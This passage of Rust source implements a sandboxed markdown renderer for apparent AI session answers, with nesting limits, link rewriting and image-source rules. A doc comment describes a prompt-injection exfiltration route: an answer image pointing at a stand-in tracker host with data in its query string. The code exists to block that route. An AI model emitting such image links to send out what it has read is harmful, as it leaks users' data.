        .unwrap_or_else(|| unrendered(&source.replace("\r\n", "\n").replace('\r', "\n")))
}

fn render_markdown_here(source: &str, options: MarkdownOptions<'_>) -> String {
    let text = source.replace("\r\n", "\n").replace('\r', "\n");
    let (front, body) = split_frontmatter(&text);
    let prepared = escape_leading_underscores(&bound_nesting(body));
    let comrak_options = comrak_options();
    let arena = comrak::Arena::new();
    let root = comrak::parse_document(&arena, &prepared, &comrak_options);
    rewrite_destinations(root, options.base, options.remote_images);
    let highlighter = FilesHighlighter;
    let mut plugins = comrak::Plugins::default();
    plugins.render.codefence_syntax_highlighter = Some(&highlighter);
    let mut bytes: Vec<u8> = Vec::new();
    // Writing into a byte vector cannot fail; a failure would leave the part already written, which is still HTML.
    let _ = comrak::html::format_document_with_plugins(root, &comrak_options, &mut bytes, &plugins);
    let rendered = rewrite_anchors(&String::from_utf8_lossy(&bytes));
    let front_html = match front {
        Some(yaml) => format!(
            "<section class=\"frontmatter\"><h2>frontmatter</h2><pre><code>{}</code></pre></section>\n",
            escape_html(trim_js(yaml))
        ),
        None => String::new(),
    };
    let base = options.base;
    let remote_images = options.remote_images;
    let policy = move |value: &str, site: UrlSite<'_>| {
        // A hand-written `<img>` in an answer follows the same rule as a markdown image there: local files only.
        if site.tag == "img" && !remote_images {
            return safe_url(value).and_then(|safe| image_source(safe, base, false));
        }
        url_for(value, base)
    };
    crate::sanitize::sanitize_html(
        &(front_html + &rendered),
        crate::sanitize::SanitizeOptions { url: Some(&policy) },
    )
}

/// Render inline spans only — a title, a table cell, a label — through the same parser and the same allow-list.
pub fn render_inline(text: &str) -> String {
    if !within_parse_budget(text) {
        return escape_html(text);
    }
    on_render_stack(|| render_inline_here(text)).unwrap_or_else(|| escape_html(text))
}

fn render_inline_here(text: &str) -> String {
    let prepared = escape_leading_underscores(&bound_nesting(text));
    let rendered = comrak::markdown_to_html(&prepared, &comrak_options());
    let body = unwrap_paragraph(&rendered);
    // An inline span is never a document's preview: its images follow an answer's rule.
    let policy = |value: &str, site: UrlSite<'_>| {
        let safe = safe_url(value)?;
        if site.tag == "img" {
            image_source(safe, None, false)
        } else {
            Some(safe.to_string())
        }
    };
    crate::sanitize::sanitize_html(
        &body,
        crate::sanitize::SanitizeOptions { url: Some(&policy) },
    )
}

/// The URL a refused destination is rewritten to before rendering, so the rewrite is one pass over the output.
///
/// A scheme neither `safe_url` nor a browser follows, and one this crate writes nowhere else: the marker cannot be
/// produced by a document, so the pass only ever acts on a destination this crate refused.
const REFUSED: &str = "heddle-refused:";

/// The parser's options: GitHub's dialect, and raw HTML passed through so the allow-list can judge it.
fn comrak_options() -> comrak::Options<'static> {
    let mut options = comrak::Options::default();
    options.extension.table = true;
    options.extension.strikethrough = true;
    options.extension.autolink = true;
    options.extension.tasklist = true;
    options.extension.footnotes = true;
    // A document's own HTML is parsed and passed through, then reduced by the allow-list: the safety guarantee sits
    // on the output, where it belongs when the parser is someone else's code.
    options.render.unsafe_ = true;
    options.render.escape = false;
    options.render.hardbreaks = false;
    options.render.github_pre_lang = false;
    options
}

/// The highlighter, as the code-fence plugin `comrak` calls.
struct FilesHighlighter;

impl comrak::adapters::SyntaxHighlighterAdapter for FilesHighlighter {
    fn write_highlighted(
        &self,
        output: &mut dyn std::io::Write,
        lang: Option<&str>,
        code: &str,
    ) -> std::io::Result<()> {
        output.write_all(crate::highlight::highlight_code(code, lang).as_bytes())
    }

    fn write_pre_tag(
        &self,
        output: &mut dyn std::io::Write,
        attributes: std::collections::HashMap<String, String>,
    ) -> std::io::Result<()> {
        output.write_all(format!("<pre{}>", render_attributes(&attributes)).as_bytes())
    }

    fn write_code_tag(
        &self,
        output: &mut dyn std::io::Write,
        attributes: std::collections::HashMap<String, String>,
    ) -> std::io::Result<()> {
        output.write_all(format!("<code{}>", render_attributes(&attributes)).as_bytes())
    }
}

/// The attributes `comrak` offers, in a stable order, escaped — the one place a fence's markup is written.
fn render_attributes(attributes: &std::collections::HashMap<String, String>) -> String {
    let mut pairs: Vec<String> = attributes
        .iter()
        .map(|(name, value)| format!(" {name}=\"{}\"", escape_html(value)))
        .collect();
    pairs.sort();
    pairs.concat()
}

/// Points every relative destination at the route that serves it, and marks a refused one for the rewrite.
///
/// A link to a workspace file keeps a **served** address, so its status bar and a middle click still point at the
/// bytes, and the panel opens it in place; an image is resolved so a document's `![](icon.svg)` looks beside the
/// document rather than at the server root.
fn rewrite_destinations<'a>(
    root: &'a comrak::nodes::AstNode<'a>,
    base: Option<&Path>,
    remote_images: bool,
) {
    let nodes: Vec<&'a comrak::nodes::AstNode<'a>> = root.descendants().collect();
    // Deepest first, so an image inside a label is already rewritten when the label is.
    for node in nodes.into_iter().rev() {
        let mut data = node.data.borrow_mut();
        let (link, image) = match &mut data.value {
            comrak::nodes::NodeValue::Link(link) => (link, false),
            comrak::nodes::NodeValue::Image(link) => (link, true),
            _ => continue,
        };
        let Some(target) = safe_url(&link.url).map(str::to_string) else {
            link.url = REFUSED.to_string();
            continue;
        };
        if image {
            // An image that is not fetched becomes its alt text, through the refused marker.
            link.url =
                image_source(&target, base, remote_images).unwrap_or_else(|| REFUSED.to_string());
            continue;
        }
        if let Some(resolved) = resolve_subresource(&target, base) {
            link.url = raw_url(&resolved);
        } else {
            link.url = target;
        }
    }
}

/// One pass over the rendered document: adds the attributes `comrak` cannot, and removes a refused anchor.
///
/// A destination that is a **file beside the document** carries its path in [`LINK_DATA_ATTRIBUTE`], which is how
/// the panel knows to open it rather than navigate; a remote link opens beside the document; a refused link keeps
/// its rendered label with the reason beside it, and a refused image becomes its alt text.
fn rewrite_anchors(html: &str) -> String {
    let mut out = String::with_capacity(html.len() + 64);
    let mut index = 0usize;
    while index < html.len() {
        let Some(at) = html[index..].find('<').map(|offset| index + offset) else {
            out.push_str(&html[index..]);
            break;
        };
        out.push_str(&html[index..at]);
        if html[at..].starts_with("<a ") {
            let Some(end) = tag_end(html, at) else {
                out.push_str(&html[at..]);
                break;
            };
            let tag = &html[at..end];
            let Some(href) = attribute_value(tag, "href") else {
                out.push_str(tag);
                index = end;
                continue;
            };
            if href == REFUSED {
                // Drop the anchor and keep what it wrapped, then say what became of it.
                let Some(close) = html[end..].find("</a>").map(|offset| end + offset) else {
                    out.push_str(&html[at..end]);
                    index = end;
                    continue;
                };
                out.push_str(&html[end..close]);
                out.push_str(" (link refused)");
                index = close + 4;
                continue;
            }
            out.push_str(&annotate(tag, &href));
            index = end;
            continue;
        }
        if html[at..].starts_with("<img ") {
            let Some(end) = tag_end(html, at) else {
                out.push_str(&html[at..]);
                break;
            };
            let tag = &html[at..end];
            if attribute_value(tag, "src").as_deref() == Some(REFUSED) {
                // A refused image becomes its alt text: nothing is fetched, and the author's words still read.
                match attribute_value(tag, "alt") {
                    Some(alt) => out.push_str(&alt),
                    None => out.push_str(tag),
                }
                index = end;
                continue;
            }
            out.push_str(tag);
            index = end;
            continue;
        }
        out.push('<');
        index = at + 1;
    }
    out
}

/// The same anchor tag with the attributes this project adds — or the path attribute for a served file.
fn annotate(tag: &str, href: &str) -> String {
    let mut extra = String::new();
    if let Some(path) = href.strip_prefix("/api/raw?path=") {
        let path = path.split('#').next().unwrap_or(path);
        extra.push_str(&format!(
            " {}=\"{}\"",
            LINK_DATA_ATTRIBUTE,
            escape_html(&percent_decode(path))
        ));
    }
    let external =
        href.starts_with("http://") || href.starts_with("https://") || href.starts_with("//");
    if external {
        extra.push_str(" target=\"_blank\"");
    }
    extra.push_str(" rel=\"noreferrer noopener\"");
    let Some(end) = tag.rfind('>') else {
        return tag.to_string();
    };
    format!("{}{}{}", &tag[..end], extra, &tag[end..])
}

/// The byte after the `>` that ends the tag beginning at `at`, honouring a quoted attribute's `>`.
fn tag_end(html: &str, at: usize) -> Option<usize> {
    let bytes = html.as_bytes();
    let mut index = at + 1;
    let mut quote: Option<u8> = None;
    while index < bytes.len() {
        match (quote, bytes[index]) {
            (Some(open), byte) if byte == open => quote = None,
            (Some(_), _) => {}
            (None, b'"' | b'\'') => quote = Some(bytes[index]),
            (None, b'>') => return Some(index + 1),
            (None, _) => {}
        }
        index += 1;
    }
    None
}

/// A tag's attribute value as written (still escaped), by name.
fn attribute_value(tag: &str, name: &str) -> Option<String> {
    let bytes = tag.as_bytes();
    let mut index = 0usize;
    while index + name.len() <= bytes.len() {
        if !tag[index..].starts_with(name) {
            index += 1;
            continue;
        }
        let boundary = index == 0 || bytes[index - 1].is_ascii_whitespace();
        let mut cursor = index + name.len();
        while cursor < bytes.len() && bytes[cursor].is_ascii_whitespace() {
            cursor += 1;
        }
        if !boundary || bytes.get(cursor) != Some(&b'=') {
            index += 1;
            continue;
        }
        cursor += 1;
        while cursor < bytes.len() && bytes[cursor].is_ascii_whitespace() {
            cursor += 1;
        }
        let quote = *bytes.get(cursor)?;
        if quote != b'"' && quote != b'\'' {
            return None;
        }
        let rest = &tag[cursor + 1..];
        let end = rest.find(quote as char)?;
        return Some(rest[..end].to_string());
    }
    None
}

/// A leading YAML block, and the body after it.
fn split_frontmatter(text: &str) -> (Option<&str>, &str) {
    let Some(rest) = text.strip_prefix("---\n") else {
        return (None, text);
    };
    let Some(at) = rest.find("\n---") else {
        return (None, text);
    };
    let content = &rest[..at];
    let after = &rest[at + 4..];
    match after.strip_prefix('\n') {
        Some(tail) => (Some(content), tail),
        None => (Some(content), after),
    }
}

/// The deepest container nesting one line may open: markdown-it's default `maxNesting`.
///
/// Live issues developer-two-15 (P0) and -16 (2026-10-29): a line of 5,000 `>` overflowed this renderer's stack and
/// aborted the server, again on every open of the session whose answer held it, and the TypeScript build failed the
/// session view from about 2,000 levels. A container nested this deep carries nothing a reader can follow, so the
/// levels past it are rendered as their text.
pub const MAX_NESTING: usize = 100;

/// The stack a render runs on: the last guard behind [`bound_nesting`], for a structure it does not bound (deep inline
/// nesting). A stack overflow cannot be caught, and a server worker's stack is a few megabytes; this is address space
/// reserved, not memory used, until a text actually nests that deep.
const RENDER_STACK_BYTES: usize = 256 * 1024 * 1024;

/// Each line opens at most [`MAX_NESTING`] containers (block quotes and list items) and keeps at most [`MAX_INDENT`]
/// columns of indentation; a marker past the bound is escaped, so it reads as its own character. **Every** line is
/// bounded, code included, as the TypeScript `boundNesting` is.
///
/// A first version skipped the lines of a code fence by its own fence test, which was looser than CommonMark's: `    ```
/// ` (four spaces, an indented code block) and `` ``` a`b `` (a backtick in a backtick fence's info string, a
/// paragraph) opened a "fence" for it but not for comrak, so every later line reached the parser unbounded, with the
/// render stack as the only guard (developer-three's review, 2026-10-30). Bounding code too fails safe; a line of real
/// code with more than a hundred nested markers, or indented past two hundred columns, is drawn bounded.
pub fn bound_nesting(markdown: &str) -> String {
    let mut out = String::with_capacity(markdown.len() + 4);
    for (index, line) in markdown.split('\n').enumerate() {
        if index > 0 {
            out.push('\n');
        }
        bound_line(&bound_indent(line), &mut out);
    }
    out
}

/// The widest indentation a line keeps, in columns (a tab reaching the next multiple of four): two for each level of
/// [`MAX_NESTING`], the least a nested list item indents by. Lists also nest by indentation, one marker per line,
/// which counting markers does not see; in the TypeScript build an indented list of 1,500 levels ran out of heap.
pub const MAX_INDENT: usize = 2 * MAX_NESTING;

fn bound_indent(line: &str) -> std::borrow::Cow<'_, str> {
    let mut column = 0usize;
    let mut at = 0usize;
    for byte in line.bytes() {
        match byte {
            b' ' => column += 1,
            b'\t' => column += 4 - column % 4,
            _ => break,
        }
        at += 1;
    }
    if column > MAX_INDENT {
        std::borrow::Cow::Owned(format!("{}{}", " ".repeat(MAX_INDENT), &line[at..]))
    } else {
        std::borrow::Cow::Borrowed(line)
    }
}

fn bound_line(line: &str, out: &mut String) {
    let bytes = line.as_bytes();
    let mut at = 0usize;
    let mut depth = 0usize;
    loop {
        while at < bytes.len() && (bytes[at] == b' ' || bytes[at] == b'\t') {
            at += 1;
        }
        if bytes.get(at) == Some(&b'>') {
            depth += 1;
            if depth > MAX_NESTING {
                out.push_str(&line[..at]);
                out.push('\\');
                out.push_str(&line[at..]);
                return;
            }
            at += 1;
            continue;
        }
        let Some(length) = list_marker_len(bytes, at) else {
            out.push_str(line);
            return;
        };
        depth += 1;
        if depth > MAX_NESTING {
            // A bullet is escaped itself; a number keeps its digits and escapes its `.` or `)`.
            let escape_at = if bytes[at].is_ascii_digit() {
                at + length - 1
            } else {
                at
            };
            out.push_str(&line[..escape_at]);
            out.push('\\');
            out.push_str(&line[escape_at..]);
            return;
        }
        at += length;
    }
}

/// The length of a list item's marker at `at` (a bullet, or up to nine digits and their `.` or `)`), when a space, a
/// tab or the end of the line follows it.
fn list_marker_len(bytes: &[u8], at: usize) -> Option<usize> {
    let first = *bytes.get(at)?;
    let length = if matches!(first, b'-' | b'+' | b'*') {
        1
    } else {
        let digits = bytes[at..]
            .iter()
            .take_while(|byte| byte.is_ascii_digit())
            .count();
        if digits == 0 || digits > 9 || !matches!(bytes.get(at + digits), Some(b'.' | b')')) {
            return None;
        }
        digits + 1
    };
    match bytes.get(at + length) {
        None | Some(b' ' | b'\t') => Some(length),
        Some(_) => None,
    }
}

/// Run a render on its own thread with [`RENDER_STACK_BYTES`] of stack; `None` when the thread could not start or
/// the render panicked, and the caller then shows the text as its own words.
fn on_render_stack<T: Send>(work: impl FnOnce() -> T + Send) -> Option<T> {
    std::thread::scope(|scope| {
        std::thread::Builder::new()
            .name("heddle-markdown".to_string())
            .stack_size(RENDER_STACK_BYTES)
            .spawn_scoped(scope, work)
            .ok()?
            .join()
            .ok()
    })
}

/// What a text that could not be rendered is shown as: its own words, escaped, so nothing is lost and nothing runs.
fn unrendered(text: &str) -> String {
    format!(
        "<pre class=\"unrendered\"><code>{}</code></pre>",
        escape_html(text)
    )
}

/// A leading `_` is escaped, so a name is a name: `_tools_` is not emphasis.
///
/// Code is left alone, because a backslash **inside code is visible**: an escape that changes the text of code is
/// worse than the emphasis it prevents. Code spans keep their underscores without help, since emphasis does not run
/// inside them.
fn escape_leading_underscores(markdown: &str) -> String {
    let mut out = String::with_capacity(markdown.len() + 16);
    let mut fence: Option<&str> = None;
    for (index, line) in markdown.split('\n').enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if let Some(marker) = fence_marker(line) {
            match fence {
                None => fence = Some(marker),
                Some(open) if open == marker => fence = None,
                Some(_) => {}
            }
            out.push_str(line);
            continue;
        }
        if fence.is_some() {
            out.push_str(line);
            continue;
        }
        for piece in split_code_spans(line) {
            if piece.starts_with('`') {
                out.push_str(piece);
            } else {
                escape_leading_underscores_in(piece, &mut out);
            }
        }
    }
    out
}

/// `/^\s*(```|~~~)/`: the fence marker a line opens with, if any.
fn fence_marker(line: &str) -> Option<&'static str> {
    let trimmed = line.trim_start();
    if trimmed.starts_with("```") {
        Some("```")
    } else if trimmed.starts_with("~~~") {
        Some("~~~")
    } else {
        None
    }
}

/// Split a line at its code spans, keeping the backticks: ``a `b` c`` is `a `, `` `b` ``, ` c`.
fn split_code_spans(line: &str) -> Vec<&str> {
    let mut pieces = Vec::new();
    let mut start = 0usize;
    let bytes = line.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index] != b'`' {
            index += 1;
            continue;
        }
        let Some(close) = line[index + 1..].find('`') else {
            break;
        };
        let end = index + 1 + close + 1;
        pieces.push(&line[start..index]);
        pieces.push(&line[index..end]);
        start = end;
        index = end;
    }
    pieces.push(&line[start..]);
    pieces
}

/// `(^|\s)_(?=[^\s_])` → `\_`: a leading underscore of a name becomes literal, and everything else is left alone.
fn escape_leading_underscores_in(text: &str, out: &mut String) {
    let mut previous: Option<char> = None;
    let mut characters = text.chars().peekable();
    while let Some(character) = characters.next() {
        if character == '_' {
            let leading = previous.is_none_or(|before| before.is_whitespace());
            let followed = characters
                .peek()
                .is_some_and(|next| !next.is_whitespace() && *next != '_');
            if leading && followed {
                out.push('\\');
            }
        }
        out.push(character);
        previous = Some(character);
    }
}

/// A relative reference resolved against the document's folder, or `None` when it is not this server's to resolve.
struct Subresource {
    path: String,
    fragment: String,
}

/// The file a relative reference names, or `None` for a remote URL, a `data:` payload, a fragment, or no base.
fn resolve_subresource(href: &str, base: Option<&Path>) -> Option<Subresource> {
    let trimmed = href.trim();
    if trimmed.is_empty() {
        return None;
    }
    let lower = trimmed.to_ascii_lowercase();
    // A remote URL is the author's choice, and a `data:` image is a payload rather than a file.
    if trimmed.starts_with("//")
        || lower.starts_with("http://")
        || lower.starts_with("https://")
        || trimmed.starts_with("data:")
    {
        return None;
    }
    // A fragment is a place inside this document, not a file beside it.
    if trimmed.starts_with('#') {
        return None;
    }
    let base = base?;
    let (target, fragment) = match trimmed.split_once('#') {
        Some((target, fragment)) => (target, fragment),
        None => (trimmed, ""),
    };
    let path = if target.starts_with('/') {
        target.to_string()
    } else {
        resolve_against(base, target)
    };
    Some(Subresource {
        path,
        fragment: fragment.to_string(),
    })
}

/// Join `target` to `base` lexically: `.` is dropped and `..` pops, but never above the root.
fn resolve_against(base: &Path, target: &str) -> String {
    let base = base.to_string_lossy();
    let mut segments: Vec<&str> = Vec::new();
    for segment in base.split('/').chain(target.split('/')) {
        match segment {
            "" | "." => {}
            ".." => {
                segments.pop();
            }
            other => segments.push(other),
        }
    }
    format!("/{}", segments.join("/"))
}

/// The route that serves a file's bytes, which is what an `<img>` and a followed link both need.
fn raw_url(resolved: &Subresource) -> String {
    let mut url = format!("/api/raw?path={}", percent_encode(&resolved.path));
    if !resolved.fragment.is_empty() {
        url.push('#');
        url.push_str(&resolved.fragment);
    }
    url
}

/// `encodeURIComponent`: every byte but an unreserved one is percent-encoded, upper-case hex.
pub(crate) fn percent_encode(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric()
            || matches!(
                byte,
                b'-' | b'_' | b'.' | b'!' | b'~' | b'*' | b'\'' | b'(' | b')'
            )
        {
            out.push(byte as char);
        } else {
            out.push('%');
            out.push_str(&format!("{byte:02X}"));
        }
    }
    out
}

/// `decodeURIComponent`, total: a stray `%` or an invalid sequence is left as written rather than refused.
fn percent_decode(value: &str) -> String {
    let bytes = value.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index] == b'%' && index + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[index + 1..index + 3]).ok();
            if let Some(byte) = hex.and_then(|hex| u8::from_str_radix(hex, 16).ok()) {
                out.push(byte);
                index += 3;
                continue;
            }
        }
        out.push(bytes[index]);
        index += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Where an image is fetched from, or `None` when it is not fetched at all (the image becomes its alt text); the
/// TypeScript `imageSource`, decision for decision.
///
/// A document's preview resolves a relative image beside the document and leaves a remote one as written. An
/// **answer** shows only local files, as DSH's `localPathMediaUrl` does ("undefined for unsupported protocols and
/// non-local paths"): an absolute path goes to the route that serves a file's bytes, and a remote, protocol-relative
/// or unresolvable source is not fetched. Before this an answer's `![x](https://tracker.example/p.png?d=…)` was
/// fetched the moment the answer was drawn, with no click, so a model led by a hostile file could send out what it
/// had read; and `![x](/api/sessions)` made the page request an API of the answer's choosing (live issue
/// developer-two-7). A value that is already the raw route (the renderer wrote it, and the sanitizer hands it back
/// as a raw `<img>`) is a local file, and is kept rather than wrapped a second time.
fn image_source(target: &str, base: Option<&Path>, remote_images: bool) -> Option<String> {
    if target.starts_with("/api/raw?") {
        return Some(target.to_string());
    }
    if let Some(resolved) = resolve_subresource(target, base) {
        return Some(raw_url(&resolved));
    }
    if remote_images {
        return Some(target.to_string());
    }
    let (path, fragment) = target.split_once('#').unwrap_or((target, ""));
    if path.starts_with('/') && !path.starts_with("//") {
        return Some(raw_url(&Subresource {
            path: path.to_string(),
            fragment: fragment.to_string(),
        }));
    }
    None
}

/// The destination a URL attribute keeps: `safe_url`, then a relative reference is pointed at the raw route.
fn url_for(value: &str, base: Option<&Path>) -> Option<String> {
    let safe = safe_url(value)?;
    let relative = scheme_of(safe).is_none() && !safe.starts_with('/') && !safe.starts_with('#');
    if !relative {
        return Some(safe.to_string());
    }
    match resolve_subresource(safe, base) {
        Some(resolved) => Some(raw_url(&resolved)),
        None => Some(safe.to_string()),
    }
}

/// Strip the paragraph a single line of inline markdown is wrapped in, so `render_inline` answers spans only.
fn unwrap_paragraph(rendered: &str) -> String {
    if rendered.matches("<p>").count() == 1 && rendered.ends_with("</p>\n") {
        let start = rendered.find("<p>").map_or(0, |at| at + 3);
        return rendered[start..rendered.len() - 5].to_string();
    }
    rendered.to_string()
}

#[cfg(test)]
mod parse_budget_tests {
    use super::*;
    #[test]
    fn over_budget_inline_input_is_escaped_without_invoking_the_parser() {
        let huge = format!("{}x{}", "*a ".repeat(800_000), " a*".repeat(800_000));
        let compact = format!(
            "{}<script>x</script>{}",
            "*a ".repeat(2_000),
            " a*".repeat(2_000)
        );
        for text in [huge, compact, "x".repeat(MAX_PARSE_BYTES + 1)] {
            assert!(!within_parse_budget(&text));
            assert_eq!(
                render_markdown(&text, MarkdownOptions::default()),
                unrendered(&text)
            );
            assert_eq!(render_inline(&text), escape_html(&text));
        }
        assert!(within_parse_budget("ordinary **bold** and *emphasis*"));
    }
    #[test]
    fn budget_edges_and_unicode_use_bytes_not_characters() {
        assert!(within_parse_budget(&"*".repeat(MAX_INLINE_MARKERS)));
        assert!(!within_parse_budget(&"*".repeat(MAX_INLINE_MARKERS + 1)));
        assert!(within_parse_budget(&"x".repeat(MAX_PARSE_BYTES)));
        assert!(!within_parse_budget(&"界".repeat(MAX_PARSE_BYTES / 3 + 1)));
    }
}
